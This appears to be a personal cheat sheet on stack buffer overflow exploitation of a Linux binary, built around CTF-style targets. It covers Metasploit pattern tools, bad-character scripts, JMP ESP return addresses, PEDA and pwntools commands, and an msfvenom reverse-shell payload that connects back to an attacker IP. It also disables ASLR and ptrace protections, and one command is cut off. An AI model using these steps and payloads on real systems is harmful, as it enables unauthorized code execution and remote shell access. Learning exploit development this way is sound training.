# Buffer Overflow in Linux Binary

1. Trigger **segmentation fault** by entering a large input

        python -c 'print "A"*1000'  | ./vuln_binary

2. Run binary

        ./vuln_binary
        
3. Attach running process to debugger (GDB/EDB)
4. Generate input pattern

        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

5. Re-trigger **segmentation fault** by passing unique input pattern, and note the reported illegal **return address** value, e.g., `0x0000000033674132`
6. Calculate the **buffer length**

        $ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 33674132
        [*] Exact match at offset 188

    For the rest of the example, let's assume, the buffer length is **188** characters

7. Test if we can control the **instruction pointer** (EIP)

        python -c 'print "A"*188 + "B"*4'  | ./vuln_binary

    An error message similar to following indicates that we successfully managed to overwrite the instruction pointer with a sequence of four "B" [ASCII characters]()

        The address 0x0000000042424242 does not appear to be mapped.

    Hexadecimal value for ASCII character `B` is `42`.

8. Test again and observe the actual **order** of input characters as they are stored in the **memory address**

        python -c 'print "A"*188 + "BCDE" + "Z"*100'  | ./vuln_binary

    The new error message is
    
        The address 0x0000000045444342 does not appear to be mapped. 

    B := 42
    C := 43
    D := 44
    E := 45

9. Locate a **register** that points to any part of input buffer, at the time of crash. Most often the **ESP** register is found to be pointing towards the end of the input buffer.
10. If it gets complicated, use **msf-nasm_shell** utility from Metasploit to get the correct opcodes for desired instructions. The goal is to redirect the execution flow to our buffer.

        $ msf-nasm_shell
        nasm > add eax,12
        00000000  83C00C            add eax,byte +0xc
        nasm > jmp eax
        00000000  FFE0              jmp eax

11. [Identify bad characters](https://www.ins1gn1a.com/identifying-bad-characters/) that cannot be included in the payload and return address

    1. **generate_hex_char.py**

            #!/usr/bin/python
            import sys
            for x in range(1,256):
                sys.stdout.write("\\x" + '{:02x}'.format(x))
            sys.stdout.write("\n");

    2. `python generate_hex_char.py > bad_char.lst`
    3. **pwn.py**

        ```python
        #!/usr/bin/python

        buf="A"*188
        eip="BCDE"
        potential_badchars="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

        print buf + eip + potential_badchars
        ```

    4. Generate a payload that includes a list of **all possible hexadecimal characters**: 
        
            python pwn.py > pwn.txt

    5. Attach GDB to target binary: `gdb ./vuln_binary`
    6. Run the binary with **new input** being read from `pwn.txt` file

            gdb-peda$ run < ./pwn.txt

    7. When segmentation fault occurs, and program execution pauses, analyse the **hex dump** to identify **bad characters**

            gdb-peda$ x /300xb $esp

    8. Remove identified bad character from input file, and repeat the entire process, until no more bad characters could be found

            gdb-peda$ finish
            gdb-peda$ run < ./updated_pwn.txt
            gdb-peda$ x /300xb $esp

12. Find a valid **return address** that will redirect code execution to memory location pointed to by the **ESP** register. 
    
    Use [OpcodeSearcher](https://www.whitelist1.com/2016/11/stack-overflow-8-exploiting-crossfire.html) tool of [Evans Debugger](https://github.com/eteran/edb-debugger) to search for a `JMP ESP` instruction or equivalent in the memory region where the code section of the target application is mapped, if required.

    Update the `pwn.py` script to include identified return address in little endian format using [Pythonâ€™s struct library](https://deceiveyour.team/2018/10/07/using-pythons-struct-pack-function-in-exploit-development/)  

        from struct import pack
        eip = pack('<L', 0x6d7e512a)

13. Generate attack payload

        msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.4 LPORT=443 -b "\x00\x20" -f py -v shellcode

14. Temporarily disable ASLR
        
        sudo sysctl -w kernel.randomize_va_space=0

    To permanently disable ASLR

        echo 0 | sudo tee 

15. Allow ptrace processes

        sudo sysctl -w kernel.yama.ptrace_scope=0


## PEDA GDB

A few commonly used commands:

    pdisas <function_name>
    pdisas main
    b * 0x0804ABCD

    pattern_create 200
    pset arg 'cyclic_pattern(200)'
    pshow arg

    run/r

    pattern_offset 0xAABBCCDD 200
    pattern_search

    shellcode
    shellcode x86/linux exec

    python
    shellcode=(...)
    end

    pset arg '"A"*76 + "BBBB" + "\x90"*500 + shellcode'
    run/r

    pset arg '"A"*76 + int2hexstr(0xEEFFGGHH) + "\x90"*500 + shellcode'

    run
    exit
    clear
    skeleton
    skeleton argv exploit-bof1.py

    set exec-wrapper ./exploit-bof1.py
    r
    c
    file bof1

    ./exploit-bof1.py bof1

---

    context code/register/stack/all
    vmmap all/binary/libc/stack/ld ...
    checksec
    nxtest
    procinfo
    getpid
    elfsymbol
    elfsymbol "symbol"
    elfsymbol printf
    elfheader
    elfheader .bss

    Search for a specific OPCODE in memory
    searchmem 0x80cd vdso
    searchmem /bin/sh all
    searchmem 0xffe4 libc

    nasm > jmp esp
    00000000  FFE4              jmp esp

    searchmem 0xffe4 libc

---

Jump to **flag()** function

    info functions
    
        0x080491e2  flag
        0x08049272  vuln
        0x080492b1  main
    
    pdisas main
    b * main+98
    run
    jump *0x080491e2

---

    gdb-peda$ python print("A"*188+"B"*4+"C"*200)
    gdb-peda$ info frame
    gdb-peda$ p /s (char*)0xffffcf1c

## Binary Analysis

* See the names and addresses of **functions** that the binary uses

        readelf -a vuln | grep FUNC | grep -vi glibc

## pwntools

    checksec vuln

    sudo pip install pwn
    from pwn import *
    target = remote("github.com", 9000)
    target = process("./challenge")
    gdb.attach(target)
    gdb.attach(target, gdbscript='b *main')
    
    target.send(x)
    target.sendline(x)
    print target.recvuntil("out")
    p64(x)
    p32(x)
    u64(x)
    u32(x)
    target.interactive()

## ROPgadget Tool

This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation.

1. Download [ROPgadget](https://github.com/JonathanSalwan/ROPgadget.git)
2. Run `ROPgadget.py` script

## References   

* https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html
* https://www.adamcouch.co.uk/python-generate-hex-characters/
* https://www.ins1gn1a.com/identifying-bad-characters/
* https://github.com/eteran/edb-debugger/issues/627
* https://www.linuxquestions.org/questions/linux-software-2/how-do-i-get-a-simple-hex-dump-in-gdb-805265/
* https://github.com/eteran/edb-debugger
* https://www.whitelist1.com/2016/11/stack-overflow-8-exploiting-crossfire.html
* https://deceiveyour.team/2018/10/07/using-pythons-struct-pack-function-in-exploit-development/
* https://hexa-unist.github.io/2015/02/26/PEDA-How-To-Use/
* https://reverseengineering.stackexchange.com/questions/18552/run-a-python-command-with-run-on-gdb
* https://null.community/event_sessions/1365-exploiting-buffer-overflow-vulnerability
* https://paper.seebug.org/papers/Archive/refs/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf
* https://www.youtube.com/watch?v=knC3B3RKARo
* https://exploitwriteup.com/0xdiablos-hack-the-box/
* https://github.com/slimm609/checksec.sh
* https://guyinatuxedo.github.io/02-intro_tooling/pwntools/index.html
* http://docs.pwntools.com/en/stable/
* https://docs.pwntools.com/_/downloads/en/stable/pdf/
* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
* https://www.geeksforgeeks.org/analyzing-bufferoverflow-with-gdb/
* ftp://ftp.gnu.org/old-gnu/Manuals/gdb/html_chapter/gdb_13.html
* https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/
* http://www.cis.syr.edu/~wedu/Teaching/CompSec/LectureNotes_New/Buffer_Overflow.pdf
* http://web.cecs.pdx.edu/~apt/cs491/gdb.pdf
* http://dbp-consulting.com/tutorials/debugging/basicAsmDebuggingGDB.html
* https://mirror.freedif.org/GNU-Sa/pgubook/ProgrammingGroundUp-0-8.pdf
* https://accessviolation.rocks/linux/2020/03/19/linux-canary.html
* https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it